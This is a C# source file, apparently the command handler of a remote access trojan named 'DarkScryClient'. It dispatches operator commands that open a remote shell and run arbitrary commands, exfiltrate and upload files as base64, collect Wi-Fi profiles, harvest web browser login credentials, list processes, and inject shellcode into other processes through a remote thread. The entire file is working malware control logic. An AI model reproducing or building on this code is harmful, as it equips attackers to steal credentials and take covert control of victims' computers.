using DarkScryClient.Moduls.Collection;
using DarkScryClient.Moduls.Collection.Files;
using DarkScryClient.Moduls.Collection.Passwords;
using DarkScryClient.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;
using System.Xml;
using WebInfoGather;
using Utils;
using Injection;

namespace DarkScryClient.Client
{
	internal class CommandHandler : IDisposable
	{
		private readonly struct CommandIdentifiers
		{
			public const string START_SHELL_INSTANCE              = "be425fd08e9ea24230bac47493228ada";
			public const string RUN_COMMAND                       = "58e129c7158b9fed8be5473640e54ae4";
			public const string GET_BASIC_MACHINE_INFO            = "929cecb8e795d93306020c7f2e8682d2";
			public const string SNAP_FULL_DIRECTORY               = "74d6aa572d1b19102f9f5aedbe00dfd0";
			public const string GET_FILE_BASE_64                  = "d69c0ca9f6848c89b7e9223b2d186a15";
			public const string UPLOAD_FILE_BASE_64               = "81324d42b1bbe52342d521ee64b7a30f";
			public const string GET_WIFI_BAISIC_INFO              = "0c9f43143832f340691b2f701b5d56fa";
			public const string FETCH_WEB_BROSER_CREDENTIALS      = "852d663cbe347857ffe2bfadb378d3be";
			public const string ENUMERATE_PROCESSES               = "57886325b8715ae917d8fde55e4de227";
			public const string SHELLCODE_INJECTION_REMOTE_THREAD = "e7fbbbf09d0c969980d29312271596e5";
		}

		private XmlDocument xmlDoc;
		private CSShellServicecs _CShellServicecs;
		public CommandHandler()
		{
			xmlDoc = new XmlDocument();
			_CShellServicecs = null;
		}

		public byte[] RunCommand(string XmlCommand)
		{
			xmlDoc.LoadXml(XmlCommand);
			string action = xmlDoc.SelectSingleNode("/root/action").InnerText;
			switch (action)
			{
				case CommandIdentifiers.START_SHELL_INSTANCE:
					if (!Info.IsMainShellRuning)
					{
						_CShellServicecs = new CSShellServicecs();	
					}
					return PackCommand("Success", CommandIdentifiers.START_SHELL_INSTANCE, 0);

				case CommandIdentifiers.RUN_COMMAND:
					if (!Info.IsMainShellRuning)
					{
						return PackCommand("Shell is not runing", action, 1);
					}
					Console.WriteLine("Runing command...");

					string command = xmlDoc.SelectSingleNode("/root/command").InnerText;
					string output = _CShellServicecs.RunCommand(command);
					Console.WriteLine("now packing...");
					return PackCommand(output, action, 0);

				case CommandIdentifiers.GET_BASIC_MACHINE_INFO:
					var bmi = MachineInfo.BasicMachineInfoRetriever.GetBasicMachineInfo();
					return Tools.StringToBytes(JsonSerializer.Serialize(bmi));

				case CommandIdentifiers.SNAP_FULL_DIRECTORY:
					Console.WriteLine("CommandIdentifiers.SNAP_FULL_DIRECTORY");
					string root_path = xmlDoc.SelectSingleNode("/root/path").InnerText;
					if (string.IsNullOrEmpty(root_path))
					{
						root_path = Environment.CurrentDirectory;
					}
					string files_and_dirs = FilesExplorer.GetFilesAndDirectories(root_path);
					return Tools.StringToBytes(JsonSerializer.Serialize(files_and_dirs));

				case CommandIdentifiers.GET_FILE_BASE_64:
					string file_path = xmlDoc.SelectSingleNode("/root/path").InnerText;
					var responseObj = new GetFileBase64Response { file_base64 = Convert.ToBase64String(File.ReadAllBytes(file_path)) };
					return Tools.StringToBytes(JsonSerializer.Serialize(responseObj));

				case CommandIdentifiers.UPLOAD_FILE_BASE_64:
					string uploaded_path = xmlDoc.SelectSingleNode("/root/path").InnerText;
					string uploaded_base64 = xmlDoc.SelectSingleNode("/root/file_base64").InnerText;
					string uploaded_file_name = xmlDoc.SelectSingleNode("/root/file_name").InnerText;
					File.WriteAllBytes(Path.Combine(uploaded_path, uploaded_file_name), Convert.FromBase64String(uploaded_base64));
					return Tools.StringToBytes(JsonSerializer.Serialize(new Dictionary<string, object> { { "status", true } }));

				case CommandIdentifiers.GET_WIFI_BAISIC_INFO:
					var profiles = GatherWifiInfo.GetBasicWifiInfo();
					return Tools.StringToBytes(JsonSerializer.Serialize(profiles));

				case CommandIdentifiers.FETCH_WEB_BROSER_CREDENTIALS:
					string credTypeString = xmlDoc.SelectSingleNode("/root/cred_type")?.InnerText;

					if (Enum.TryParse(credTypeString, out WebCredentialCollector.CollectionType credType))
					{
						return Tools.StringToBytes(JsonSerializer.Serialize(WebCredentialCollector.GatherLoginData(credType)));
					}

					return Tools.StringToBytes("Unknown cred_type.");

				case CommandIdentifiers.ENUMERATE_PROCESSES:
					return Tools.StringToBytes(JsonSerializer.Serialize(ProcessEnum.EnumProcesses()));

				case CommandIdentifiers.SHELLCODE_INJECTION_REMOTE_THREAD:
					byte[] shellcode = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/shellcode")?.InnerText);
					int.TryParse(xmlDoc.SelectSingleNode("/root/pid")?.InnerText, out int pid);
					Dictionary<string, bool> result = new Dictionary<string, bool> { { "success", RemoteThreadInjections.RemoteThreadShellcode(pid, shellcode) } };
					return Tools.StringToBytes(JsonSerializer.Serialize(result));

				default:
					return PackCommand("Unknow Action", action, 1);
			}
		}

		private byte[] PackCommand(string output, string type, int status) 
		{
			Models.CommandOutput model = new Models.CommandOutput { output = output, type = type, status = status };
			return Tools.SerializeToJson(model);
		}

		public void Dispose()
		{
			_CShellServicecs?.Dispose();
		}
	}
}
